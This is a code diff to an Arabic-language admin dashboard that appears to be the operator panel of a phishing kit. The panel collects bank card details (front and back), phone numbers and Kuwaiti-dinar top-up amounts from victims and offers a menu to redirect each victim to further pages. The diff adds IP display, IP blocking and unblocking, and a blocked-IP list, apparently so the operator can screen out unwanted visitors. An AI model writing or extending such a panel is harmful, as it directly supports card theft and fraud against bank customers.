@@ -97,6 +97,15 @@
   }
   .tbl-btn.details{background:#1565c0;color:#fff}
   .tbl-btn.details:hover{background:#0d47a1}
+  .tbl-btn.block{background:#e4312a;color:#fff}
+  .tbl-btn.block:hover{background:#c62828}
+  .tbl-btn.unblock{background:#1e9e5a;color:#fff}
+  .tbl-btn.unblock:hover{background:#157a45}
+  .ip-cell{font-family:monospace;font-size:13px;direction:ltr;color:#374151}
+  .blocked-item{display:flex;align-items:center;justify-content:space-between;padding:8px 0;border-bottom:1px solid #f0f2f5}
+  .blocked-item:last-child{border-bottom:none}
+  .blocked-ip{font-family:monospace;font-size:15px;font-weight:700;direction:ltr}
+  .blocked-time{color:var(--ink-soft);font-size:13px}
   .tbl-btn.redirect{background:#7b1fa2;color:#fff;position:relative}
   .tbl-btn.redirect:hover{background:#5c1480}
 
@@ -309,6 +318,18 @@
     <div class="stats">
       <div class="stat"><div class="num" id="totalOrders">0</div><div class="lbl">إجمالي الطلبات</div></div>
       <div class="stat"><div class="num" id="liveVisitors">0</div><div class="lbl">زيارات نشطة الآن</div></div>
+      <div class="stat"><div class="num" id="blockedCount">0</div><div class="lbl">IPs محظورة</div></div>
+    </div>
+
+    <!-- Blocked IPs Section -->
+    <div class="table-card" id="blockedSection" style="margin-bottom:18px;display:none">
+      <div class="table-head">
+        <h2>🚫 IPs المحظورة</h2>
+        <button class="clear-btn" id="toggleBlocked" onclick="toggleBlockedList()">إخفاء</button>
+      </div>
+      <div id="blockedList" style="padding:12px 18px">
+        <p style="color:var(--ink-soft);text-align:center;padding:10px">لا توجد IPs محظورة</p>
+      </div>
     </div>
 
     <div class="table-card">
@@ -322,6 +343,7 @@
             <tr>
               <th>البنك</th>
               <th>رقم الجوال</th>
+              <th>IP</th>
               <th>قيمة الشحن</th>
               <th>الوقت</th>
               <th>الحالة</th>
@@ -329,7 +351,7 @@
             </tr>
           </thead>
           <tbody id="rows">
-            <tr><td colspan="5" class="empty">لا توجد طلبات بعد</td></tr>
+            <tr><td colspan="7" class="empty">لا توجد طلبات بعد</td></tr>
           </tbody>
         </table>
       </div>
@@ -360,6 +382,7 @@
   let allSubmissions = [];
   let lastCount = 0;
   let lastDataKeys = new Set();
+  let blockedIps = new Set();
 
   const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
   function playAlert() {
@@ -469,20 +492,29 @@
   function render(list){
     document.getElementById('totalOrders').textContent = list.length;
     const rows = document.getElementById('rows');
-    if(!list.length){ rows.innerHTML = '<tr><td colspan="6" class="empty">لا توجد طلبات بعد</td></tr>'; return; }
+    if(!list.length){ rows.innerHTML = '<tr><td colspan="7" class="empty">لا توجد طلبات بعد</td></tr>'; return; }
     rows.innerHTML = list.map(s => {
       const bank = detectBank(s.card);
       const bankCell = bank
         ? '<img src="'+escapeHtml(bank.logo)+'" alt="" style="height:22px;width:auto;vertical-align:middle;margin-left:6px" onerror="this.style.display=\'none\'"><span style="font-size:12px;font-weight:700">'+escapeHtml(bank.name)+'</span>'
         : '<span style="color:var(--ink-soft);font-size:12px">—</span>';
+      const ipVal = s.ip || '—';
+      const isBlocked = blockedIps.has(s.ip);
+      const blockBtn = s.ip
+        ? (isBlocked
+          ? '<button class="tbl-btn unblock" onclick="unblockIp(\''+escapeHtml(s.ip)+'\')">إلغاء الحظر</button>'
+          : '<button class="tbl-btn block" onclick="blockIp(\''+escapeHtml(s.ip)+'\')">حظر IP</button>')
+        : '';
       return '<tr>' +
         '<td>'+bankCell+'</td>' +
         '<td><span class="phone">'+escapeHtml(s.phone)+'</span></td>' +
+        '<td><span class="ip-cell">'+escapeHtml(ipVal)+'</span></td>' +
         '<td><span class="amount">'+escapeHtml(s.amount)+'</span> د.ك</td>' +
         '<td class="time">'+fmtTime(s.time)+'</td>' +
         '<td>'+statusBadge(s.status)+'</td>' +
         '<td class="td-actions">' +
           '<button class="tbl-btn details" onclick="openDetails(\''+s.id+'\')">التفاصيل</button>' +
+          blockBtn +
           '<div class="redirect-wrap">' +
             '<button class="tbl-btn redirect" onclick="toggleRedirectMenu(this,\''+s.id+'\')">إعادة التوجيه ▾</button>' +
             '<div class="redirect-menu">' +
@@ -722,6 +754,7 @@
     const body = document.getElementById('modalBody');
     body.innerHTML = cardFrontHtml + cardBackHtml +
       '<div class="detail-row"><span class="detail-label">رقم الجوال</span><span class="detail-value">'+escapeHtml(s.phone)+'</span></div>' +
+      '<div class="detail-row"><span class="detail-label">عنوان IP</span><span class="detail-value">'+escapeHtml(s.ip||'—')+'</span></div>' +
       '<div class="detail-row"><span class="detail-label">قيمة الشحن</span><span class="detail-value">'+escapeHtml(s.amount)+' د.ك</span></div>' +
       '<div class="detail-row"><span class="detail-label">الوقت</span><span class="detail-value" style="font-family:inherit;direction:rtl">'+fmtTime(s.time)+'</span></div>';
 
@@ -780,9 +813,10 @@
   function showDash(){
     loginWrap.style.display = 'none';
     dash.style.display = 'block';
+    loadBlockedIps();
     loadData();
     clearInterval(pollTimer);
-    pollTimer = setInterval(loadData, 4000);
+    pollTimer = setInterval(() => { loadData(); loadBlockedIps(); }, 4000);
   }
 
   function logout(){
@@ -803,6 +837,69 @@
     await fetch('/api/admin/clear',{method:'POST',headers:{'Authorization':'Bearer '+token()}});
     loadData();
   });
+
+  async function loadBlockedIps() {
+    try {
+      const r = await fetch('/api/admin/blocked-ips', { headers: { 'Authorization': 'Bearer ' + token() } });
+      if (!r.ok) return;
+      const d = await r.json();
+      const list = d.ips || [];
+      blockedIps = new Set(list.map(x => x.ip));
+      document.getElementById('blockedCount').textContent = list.length;
+      const section = document.getElementById('blockedSection');
+      if (list.length > 0) {
+        section.style.display = 'block';
+        document.getElementById('blockedList').innerHTML = list.map(x =>
+          '<div class="blocked-item">' +
+            '<div><span class="blocked-ip">' + escapeHtml(x.ip) + '</span> <span class="blocked-time">' + fmtTime(x.blocked_at) + '</span></div>' +
+            '<button class="tbl-btn unblock" onclick="unblockIp(\'' + escapeHtml(x.ip) + '\')">إلغاء الحظر</button>' +
+          '</div>'
+        ).join('');
+      } else {
+        section.style.display = 'none';
+      }
+    } catch (e) {}
+  }
+
+  async function blockIp(ip) {
+    if (!confirm('حظر IP: ' + ip + '؟')) return;
+    try {
+      await fetch('/api/admin/block-ip', {
+        method: 'POST',
+        headers: { 'Authorization': 'Bearer ' + token(), 'Content-Type': 'application/json' },
+        body: JSON.stringify({ ip: ip })
+      });
+      blockedIps.add(ip);
+      loadBlockedIps();
+      loadData();
+    } catch (e) {}
+  }
+
+  async function unblockIp(ip) {
+    if (!confirm('إلغاء حظر IP: ' + ip + '؟')) return;
+    try {
+      await fetch('/api/admin/unblock-ip', {
+        method: 'POST',
+        headers: { 'Authorization': 'Bearer ' + token(), 'Content-Type': 'application/json' },
+        body: JSON.stringify({ ip: ip })
+      });
+      blockedIps.delete(ip);
+      loadBlockedIps();
+      loadData();
+    } catch (e) {}
+  }
+
+  function toggleBlockedList() {
+    const list = document.getElementById('blockedList');
+    const btn = document.getElementById('toggleBlocked');
+    if (list.style.display === 'none') {
+      list.style.display = 'block';
+      btn.textContent = 'إخفاء';
+    } else {
+      list.style.display = 'none';
+      btn.textContent = 'عرض';
+    }
+  }
 
   if(token()) showDash();
 </script>
